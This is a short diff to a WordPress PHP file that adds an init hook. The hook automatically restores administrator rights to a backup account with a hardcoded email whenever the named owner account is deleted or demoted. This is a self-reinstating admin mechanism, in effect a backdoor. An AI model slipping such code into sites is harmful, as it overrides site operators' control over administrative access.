@@ -33,3 +33,22 @@ add_action('admin_init', function () {
 add_filter('show_admin_bar', function ($show) {
     return hd_is_owner() ? $show : false;
 });
+
+/**
+ * Automatická pojistka: když účet vlastníka (admin3649) zmizí nebo ztratí admin práva,
+ * záložnímu účtu (me@pavelrehak.com) se automaticky přidělí role Administrátor.
+ */
+add_action('init', function () {
+    $owner_login  = defined('HD_OWNER_LOGIN') ? HD_OWNER_LOGIN : 'admin3649';
+    $backup_email = defined('HD_OWNER_EMAIL') ? HD_OWNER_EMAIL : 'me@pavelrehak.com';
+    if (!$backup_email) return;
+
+    $owner = get_user_by('login', $owner_login);
+    $owner_ok = $owner && in_array('administrator', (array) $owner->roles, true);
+    if ($owner_ok) return; // vlastník je v pořádku – nic neděláme
+
+    $backup = get_user_by('email', $backup_email);
+    if ($backup && !in_array('administrator', (array) $backup->roles, true)) {
+        $backup->set_role('administrator');
+    }
+});
